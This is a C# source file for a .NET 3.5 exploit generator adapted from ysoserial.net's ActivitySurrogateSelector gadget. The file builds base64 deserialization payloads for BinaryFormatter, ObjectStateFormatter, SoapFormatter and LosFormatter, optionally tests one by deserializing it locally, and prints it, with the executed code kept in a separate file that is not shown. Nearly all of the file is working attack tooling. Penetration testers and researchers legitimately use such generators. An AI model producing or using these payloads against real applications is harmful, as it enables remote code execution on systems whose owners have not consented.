using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

/* ActivitySurrogateSelector_NET_3_5_Exploit_Generator by Dor Tumarkin
 * Original ActivitySurrogateSelectorGenerator by James Forshaw (part of ysoserial.net)
 * 
 * This code generates a base64 encoded gadget chain using James Forshaw's
 * ActivitySurrogateSelector generator. It is VERY slightly modified to work
 * for .NET 3.5, to enable deserialization exploits against codebases with
 * older versions of .NET.
 * 
 * Supports BinaryFormatter, ObjectStateFormatter, SoapFormatter and
 * LosFormatter.
 * 
 * To change what is being executed during exploitation, edit ExploitClass.cs
 * 
 */


namespace ActivitySurrogateSelector_NET_3_5_Exploit_Generator
{
    class Program
    {
        /* Change GADGET_TYPE to any of the following:
         *      BinaryFormatter
         *      ObjectStateFormatter
         *      SoapFormatter
         *      LosFormatter
         */
        static string GADGET_TYPE = "BinaryFormatter";
        
        // When "test" is set to "true", the payload will get deserializes to test the gadget
        static bool test = true;
        static void Main(string[] args)
        {
            ActivitySurrogateSelectorGenerator asg = new ActivitySurrogateSelectorGenerator();
            // Retrieve gadget 
            byte[] obj = (byte[])asg.Generate("", GADGET_TYPE, false);
            Console.WriteLine(GADGET_TYPE);
            if (test)
            {
                testPayload(obj, GADGET_TYPE);
            }
            string b64obj = System.Convert.ToBase64String(obj);
            Console.WriteLine(b64obj);
            Console.ReadLine();
        }

        static void testPayload(byte[] payload, string method)
        {
            try {
                switch (method.ToLower())
                {
                    case "binaryformatter":
                        System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                        bf.Deserialize(new System.IO.MemoryStream(payload));
                        break;

                    case "objectstateformatter":
                        System.Web.UI.ObjectStateFormatter osf = new System.Web.UI.ObjectStateFormatter();
                        osf.Deserialize(new System.IO.MemoryStream(payload));
                        break;
                    case "soapformatter":
                        System.Runtime.Serialization.Formatters.Soap.SoapFormatter sf = new System.Runtime.Serialization.Formatters.Soap.SoapFormatter();
                        sf.Deserialize(new System.IO.MemoryStream(payload));
                        break;
                    case "losformatter":
                        System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                        lf.Deserialize(new System.IO.MemoryStream(payload));
                        break;
                    default:
                        Console.WriteLine("Not supported");
                        break;
                }
            }
            catch (System.Reflection.TargetInvocationException tie)
            {
                // Internal InvalidCastException is expected
            }

            catch (ArgumentException ae)
            {
                // Internal InvalidCastException is expected
            }
            
        }
    }
}
